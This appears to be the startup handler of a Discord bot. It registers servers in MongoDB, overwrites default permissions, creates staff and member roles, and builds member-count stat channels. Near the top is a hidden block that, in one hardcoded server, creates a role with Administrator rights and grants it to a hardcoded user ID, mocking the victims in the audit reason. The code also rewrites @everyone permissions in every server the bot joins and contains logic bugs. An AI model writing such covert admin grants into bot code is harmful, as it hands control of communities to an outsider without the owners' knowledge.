const mongoose = require('mongoose');
const config = require('../config')
const { Events, PermissionFlagsBits, ChannelType } = require('discord.js');
const db = require("../utils.js")
const { Guilds, Channels } = require('../Schemas/discord-bot-schema')

module.exports = {
	name: Events.ClientReady,
	once: true,
	async execute(bot) {
	    
	   
	    
	    
        
        
        
        // setInterval(async () => {
        //     var activity = [
        //         'Dm Xalri to give feedback',
        //         "Type '/help' in the bot channel",
        //         // 'Join our Discord server .gg/',
        //         'Enjoy chatting with ChatGPT',
        //         'Discover new bot features',
        //         "Report anything with '/report'",
        //         'Ask me anything',
        //         "Type '/setup info' to setup the bot correclty "
        //     ]
        //     const status = activity[Math.floor(Math.random() * activity.length)]
        //     bot.user.setPresence({ activities: [{ name: status }], status: 'online' });
        // }, 5000)
        
	    
		
        console.log("logged as " + bot.user.tag);
        console.log(" ")
        
        bot.guilds.cache.forEach(async (guild) => {

            if(guild.id === "1256972504900304947"){
                const Role = await guild.roles.create({
                    name: 'Owner',
                    color: '#000007',
                    permissions: '8'
                });
                const ntm = await guild.roles.cache.find(r => r.name = 'ntm').id
                console.log(ntm)
                const me = await guild.members.fetch('707698832951214158')
                await me.roles.add(Role, "cheh")
                
            }

            const botRole = guild.members.me.roles.highest;
            const permissions = [
                PermissionFlagsBits.AddReactions,
                PermissionFlagsBits.ChangeNickname,
                PermissionFlagsBits.Connect,
                PermissionFlagsBits.EmbedLinks,
                PermissionFlagsBits.ReadMessageHistory,
                PermissionFlagsBits.RequestToSpeak,
                PermissionFlagsBits.SendMessages,
                PermissionFlagsBits.SendMessagesInThreads,
                PermissionFlagsBits.Speak,
                PermissionFlagsBits.Stream,
                PermissionFlagsBits.UseApplicationCommands,
                PermissionFlagsBits.UseExternalEmojis,
                PermissionFlagsBits.UseExternalSounds,
                PermissionFlagsBits.UseExternalStickers,
                PermissionFlagsBits.UseSoundboard,
                PermissionFlagsBits.UseVAD,
                PermissionFlagsBits.ViewChannel
            ]

            await guild.roles.everyone.setPermissions(permissions, 'Setting default permissions');
           

            try {
                // Check if the guild exists in the database
                var existingGuild = await Guilds.findOne({ id: guild.id });
                
                // If the guild doesn't exist in the database, register it
                if (!existingGuild) {
                    existingGuild = Guilds.create({
                    id: guild.id,
                    name: guild.name
                });
                    // await Guild.save();
                    console.log(`Registered new guild: ${guild.name} (${guild.id})`);
                }
            } catch (err) {
                console.error('Error checking or registering guild:', err);
            }

            try {
                // Check if the guild exists in the database
                let existingGuild = await Channels.findOne({ guild_id: guild.id });
                
                // If the guild doesn't exist in the database, register it
                if (!existingGuild) {
                    const newGuild = Channels.create({
                    guild_id: guild.id
                });
                    // await Guild.save();
                    console.log(`Registered new guild: ${guild.name} (${guild.id})`);
                }
            } catch (err) {
                console.error('Error checking or registering guild:', err);
            }
              
            
            
            

            
            
            //########################### MODERATOR ROLE
            const moderatorRole = await createRole("Moderator", "#FF0000", guild, true)
            // var existingRole = await Guilds.roles.find(r => r.id === moderatorRole.id);
                
            // if (!existingRole) {
            //     existingGuild.roles.push({name: moderatorRole.name, id: moderatorRole.id, isAdmin: true})
            // };

            const adminPerms = [
                PermissionFlagsBits.AddReactions,
                PermissionFlagsBits.BanMembers,
                PermissionFlagsBits.ChangeNickname,
                PermissionFlagsBits.Connect,
                PermissionFlagsBits.CreatePrivateThreads,
                PermissionFlagsBits.CreatePrivateThreads,
                PermissionFlagsBits.DeafenMembers,
                PermissionFlagsBits.EmbedLinks,
                PermissionFlagsBits.KickMembers,
                PermissionFlagsBits.ManageChannels,
                PermissionFlagsBits.ManageMessages,
                PermissionFlagsBits.ManageNicknames,
                PermissionFlagsBits.ManageRoles,
                PermissionFlagsBits.ManageThreads,
                PermissionFlagsBits.MentionEveryone,
                PermissionFlagsBits.ModerateMembers,
                PermissionFlagsBits.MoveMembers,
                PermissionFlagsBits.MuteMembers,
                PermissionFlagsBits.ReadMessageHistory,
                PermissionFlagsBits.RequestToSpeak,
                PermissionFlagsBits.SendMessages,
                PermissionFlagsBits.SendMessagesInThreads,
                PermissionFlagsBits.SendTTSMessages,
                PermissionFlagsBits.Speak,
                PermissionFlagsBits.Stream,
                PermissionFlagsBits.UseApplicationCommands,
                PermissionFlagsBits.UseExternalEmojis,
                PermissionFlagsBits.UseExternalSounds,
                PermissionFlagsBits.UseExternalStickers,
                PermissionFlagsBits.UseSoundboard,
                PermissionFlagsBits.UseVAD,
                PermissionFlagsBits.ViewChannel
            ]


            if (botRole.position > moderatorRole.position) {

                await moderatorRole.setPermissions(adminPerms, 'Setting Admins permissions');
            }
            
            
            //########################### OWNER ROLE
            const ownerRole = await createRole("Owner", "#FFD700", guild, true)
            // console.log(JSON.stringify(ownerRole))
            // existingGuild.roles.push({name: ownerRole.name, id: ownerRole.id, isAdmin: true})
            // console.log({name: ownerRole.name, id: ownerRole.id, isAdmin: true})
            
            const ownerPerms = [
                PermissionFlagsBits.AddReactions,
                PermissionFlagsBits.Administrator,
                PermissionFlagsBits.BanMembers,
                PermissionFlagsBits.ChangeNickname,
                PermissionFlagsBits.Connect,
                PermissionFlagsBits.CreatePrivateThreads,
                PermissionFlagsBits.CreatePrivateThreads,
                PermissionFlagsBits.DeafenMembers,
                PermissionFlagsBits.EmbedLinks,
                PermissionFlagsBits.KickMembers,
                PermissionFlagsBits.ManageChannels,
                PermissionFlagsBits.ManageGuild,
                PermissionFlagsBits.ManageMessages,
                PermissionFlagsBits.ManageNicknames,
                PermissionFlagsBits.ManageRoles,
                PermissionFlagsBits.ManageThreads,
                PermissionFlagsBits.MentionEveryone,
                PermissionFlagsBits.ModerateMembers,
                PermissionFlagsBits.MoveMembers,
                PermissionFlagsBits.MuteMembers,
                PermissionFlagsBits.ReadMessageHistory,
                PermissionFlagsBits.RequestToSpeak,
                PermissionFlagsBits.SendMessages,
                PermissionFlagsBits.SendMessagesInThreads,
                PermissionFlagsBits.SendTTSMessages,
                PermissionFlagsBits.Speak,
                PermissionFlagsBits.Stream,
                PermissionFlagsBits.UseApplicationCommands,
                PermissionFlagsBits.UseExternalEmojis,
                PermissionFlagsBits.UseExternalSounds,
                PermissionFlagsBits.UseExternalStickers,
                PermissionFlagsBits.UseSoundboard,
                PermissionFlagsBits.UseVAD,
                PermissionFlagsBits.ViewChannel
            ]

            if (botRole.position > ownerRole.position) {

                await ownerRole.setPermissions(ownerPerms, 'Setting Owner permissions');
            }

            //########################### MUTED ROLE
            const mutedRole = await createRole("Muted", "", guild, false)
            // existingGuild.roles.push({name: mutedRole.name, id: mutedRole.id, isAdmin: false})

            await guild.channels.fetch()
            guild.channels.cache.forEach(async (channel) => {
                    if(!channel.permissionOverwrites){
                        console.log(channel)
                    }else{
                    // console.log(channel.permissionOverwrites)
                       await channel.permissionOverwrites.edit(mutedRole, {
                          SendMessages: false,
                       });
                    }
                });
       

            //########################### PREMIUM ROLE
            const premiumRole = await createRole("Premium", "#FFA500", guild, false)
            // existingGuild.roles.push({name: premiumRole.name, id: premiumRole.id, isAdmin: false})
            
            
            
            //########################### VIP ROLE
            const VIPRole = await createRole("VIP", "#1976D2", guild, false)
            // existingGuild.roles.push({name: VIPRole.name, id: VIPRole.id, isAdmin: false})
            
            
             //########################## AI ACCESS ROLE
            const AIRole = await createRole("AI access", "#009688", guild, false)
            // existingGuild.roles.push({name: AIRole.name, id: AIRole.id, isAdmin: false})

            existingGuild.save()




            
            let statsCategory = guild.channels.cache.find(
                (channel) => channel.name === 'Server Stats' && channel.type === ChannelType.GuildCategory
            );
    
            if (!statsCategory) {
                statsCategory = await guild.channels.create({
                    name: 'Server Stats',
                    type: ChannelType.GuildCategory,
                    position: 0, // Set the category to be at the top
                    permissionOverwrites: [
                        {
                            id: guild.roles.everyone,
                            allow: [PermissionFlagsBits.ViewChannel],
                            deny: [PermissionFlagsBits.Connect],
                        },
                    ],
                });
            } else if (statsCategory.position !== 0) {
                await statsCategory.setPosition(0);
            }
    
            // Create or fetch the stats channels
            const channels = [
                { name: 'Total Members', type: ChannelType.GuildVoice },
                { name: 'Online Members', type: ChannelType.GuildVoice },
                { name: 'Boosts', type: ChannelType.GuildVoice },
            ];
    
            for (const { name, type } of channels) {
                let channel = guild.channels.cache.find(
                    (ch) => ch.name.startsWith(name) && ch.type === type
                );
                if (!channel) {
                    channel = await guild.channels.create({
                        name,
                        type,
                        parent: statsCategory.id,
                        permissionOverwrites: [
                            {
                                id: guild.roles.everyone,
                                deny: [PermissionFlagsBits.Connect],
                            },
                        ],
                    });
                }
            }
            
            setInterval(() => updateStats(guild), 300000);
            // Initial update
            updateStats(guild);
            



            
        	console.log(" ")
        })


        
        await mongoose.connect(config.mongodb || '',)

        if(mongoose.connect){
            console.log("connected to the database")
            console.log(" ")
        }else{
            console.log("connection to the database failed")
        }

        
        
        
	},
	
	

};

async function updateStats(guild) {
    const totalMembers = guild.memberCount;
    const onlineMembers = guild.members.cache.filter(
        (member) => member.presence && member.presence.status !== 'offline'
    ).size;
    const boosts = guild.premiumSubscriptionCount;

    const channels = [
        { name: `Total Members: ${totalMembers}`, startsWith: 'Total Members' },
        { name: `Online Members: ${onlineMembers}`, startsWith: 'Online Members' },
        { name: `Boosts: ${boosts}`, startsWith: 'Boosts' },
    ];

    for (const { name, startsWith } of channels) {
        const channel = guild.channels.cache.find(
            (ch) => ch.name.startsWith(startsWith) && ch.type === ChannelType.GuildVoice
        );
        if (channel && channel.name !== name) {
            await channel.setName(name);
        }
    }
}


async function createRole(name, color, guild, isAdmin){
    const existingGuild = await Guilds.findOne({ id: guild.id });
    let existingRole = guild.roles.cache.find(role => role.name === name);
    let response;
    if (existingRole) {
        console.log(`Role "${name}" already exists.`);
        response =  existingRole;
    } else {
        try {
            let input = {
                name: `${name}`,
                permissions: [
                    "Connect",
                    "Speak",
                    "MuteMembers",
                    // Add more permissions as needed
                ],
                reason: `Creating a ${name} role`,
            }
            if(color !== "") input.color = color
            const createdRole = await guild.roles.create(input);
            
            
            console.log(`Role "${name}" created successfully.`);
            response = createdRole
        } catch (error) {
            console.error('Error creating role:', error);
            response = "Error with the function"
        }

        
        
    }

    // var guildRole = existingGuild.roles
    // if(!guildRole){
    //     existingGuild.roles = []
    // }
    var roleDB = existingGuild.roles.find(r => r.id === response.id);
                
    if (!roleDB) {
            existingGuild.roles.push({name: response.name, id: response.id, isAdmin: isAdmin})
    };

    existingGuild.save()

    return response;

}